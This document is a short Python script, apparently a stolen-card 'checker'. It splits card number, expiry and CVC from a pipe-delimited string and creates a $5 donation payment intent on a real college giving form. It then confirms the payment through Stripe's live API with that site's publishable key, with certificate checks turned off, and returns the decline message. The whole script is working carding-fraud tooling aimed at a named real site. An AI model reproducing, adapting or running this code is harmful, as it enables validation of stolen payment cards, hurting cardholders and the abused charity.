import requests

def chk(cc):
    try:
        # Split the credit card details
        cnum, month, year, cvc = cc.split('|')
    except ValueError:
        return "Invalid input format. Use 'cnum|month|year|cvc'"

    # Initialize session
    s = requests.Session()
    
    # Define proxies (update if needed)
    proxies = {}
    
    # --- FIRST REQUEST: Get payment intent from go.mc.edu ---
    headers1 = {
        'authority': 'go.mc.edu',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://go.mc.edu',
        'referer': 'https://go.mc.edu/register/giving',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data1 = {
        'cmd': 'getIntent',
        'amount': '5',
        'payment_type': 'card',
        'summary': 'Donations',
        'currency': 'usd',
        'account': 'acct_1KQdE6PmVGzx57IR',
        'setupFutureUsage': '',
        'test': '0',
        'add_fee': '0',
    }

    try:
        response1 = s.post(
            'https://go.mc.edu/register/form',
            headers=headers1,
            params={'cmd': 'payment'},
            data=data1,
            proxies=proxies,
            verify=False
        )
        response1.raise_for_status()
        idresp = response1.json()
    except Exception as e:
        return f"First request failed: {str(e)}"

    # Extract client secret and payment ID
    cs = idresp.get("clientSecret")
    pid = idresp.get("id")
    if not cs or not pid:
        return "Missing clientSecret or payment ID in initial response"

    # --- SECOND REQUEST: Confirm payment with Stripe ---
    headers2 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data2 = {
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': cnum,
        'payment_method_data[card][cvc]': cvc,
        'payment_method_data[card][exp_month]': month,
        'payment_method_data[card][exp_year]': year,
        'payment_method_data[allow_redisplay]': 'unspecified',
        'payment_method_data[billing_details][address][postal_code]': '10080',
        'payment_method_data[billing_details][address][country]': 'US',
        'payment_method_data[pasted_fields]': 'number',
        'payment_method_data[payment_user_agent]': 'stripe.js/81cb80e68b; stripe-js-v3/81cb80e68b',
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_f1etgxOxEyOS3K9myaBrBqrA',
        'client_secret': cs
    }

    try:
        response2 = s.post(
            f'https://api.stripe.com/v1/payment_intents/{pid}/confirm',
            headers=headers2,
            data=data2,
            proxies=proxies,
            verify=False
        )
        response2.raise_for_status()
        result = response2.json()
    except Exception as e:
        return f"Second request failed: {str(e)}"

    return result.get('error', {}).get('message', 'No errors detected')
